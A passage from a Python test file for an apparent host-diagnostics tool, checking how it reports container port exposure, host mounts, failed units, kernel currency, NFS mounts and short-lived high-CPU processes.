        {"proto": "tcp", "port": 6379, "processes": ["docker-proxy"],
         "containers": ["sideproject-redis-1"]}]}
    assert "inbound_filtered" not in ev._exposure(data["listeners"], None, None)


def test_published_ports_and_host_access_reach_the_container_contexts():
    built = evidenced()
    listed = {c["name"]: c for c in built[ContextKind.CONTAINERS].state["containers"]
              ["containers"]}
    assert listed["shopfront-web-1"]["published"] == ["0.0.0.0:3000->3000/tcp"]
    assert listed["shopfront-db-1"]["network_mode"] == "host"
    assert listed["shopfront-db-1"]["host_mounts"] == ["/var/run/docker.sock"]
    quiet = listed["shopfront-worker-1"]   # nothing published, bridge, no host mounts
    assert not {"published", "network_mode", "host_mounts"} & set(quiet)
    one = built[ContextKind.CONTAINER].state["container"]
    assert one["published"] == [] and one["network_mode"] in ("bridge", "host")


def test_a_failed_unit_carries_its_service_record():
    unit_state = evidenced()[ContextKind.UNIT].state
    assert unit_state["service"]["restarts"] == 4
    assert unit_state["service"]["exec"] == ["/usr/lib/casper/casper-md5check"]


def test_the_kernel_says_whether_the_newest_installed_kernel_is_running():
    assert ev._kernels({"entries": ["vmlinuz-6.8.0-147-generic", "vmlinuz-6.8.0-99-generic",
                                    "config-6.8.0-150-generic"]},
                       {"release": "6.8.0-147-generic"}) == {
        "running": "6.8.0-147-generic", "newest_installed": "6.8.0-147-generic",
        "installed": 2, "running_is_newest": True}
    behind = ev._kernels({"entries": ["vmlinuz-6.8.0-147-generic", "vmlinuz-6.8.0-150-generic"]},
                         {"release": "6.8.0-147-generic"})
    assert behind["newest_installed"] == "6.8.0-150-generic"
    assert behind["running_is_newest"] is False
    assert ev._kernels({"entries": []}, {"release": "6.8.0-1"})["running_is_newest"] is True
    kernel = evidenced()[ContextKind.KERNEL].state
    assert kernel["kernels"]["running_is_newest"] is True
    assert not set(ev.KERNEL_PROBES) & set(kernel)   # joined, never carried raw


def test_mounts_say_what_is_read_only_networked_and_gone():
    storage = evidenced()[ContextKind.STORAGE].state["mounts"]
    assert storage == {"count": 2, "read_only": ["/mnt/models"], "network": [
        {"target": "/mnt/models", "source": "nas:/volume1/models", "fstype": "nfs4"}],
        "added": ["/mnt/models"], "removed": []}


def test_a_process_seconds_old_is_not_hot_on_its_lifetime_cpu():
    # The process probe's own ps read itself at 700% at 0 s elapsed (2026-10-28).
    data = host()
    data["processes"] = processes(proc(9001, "ps", cpu_pct=700.0))
    data["processes"]["top_cpu"][0]["elapsed_s"] = 0
    e, _, _ = make()
    feed(e, data, T0)
    assert not [c for c in e.contexts(T0 + 1) if c.kind == "process"]
    data["processes"]["top_cpu"][0]["elapsed_s"] = ev.PROCESS_MIN_AGE_S
    e, _, _ = make()
    feed(e, data, T0)
    assert [c.entity for c in e.contexts(T0 + 1) if c.kind == "process"] == ["process:9001"]
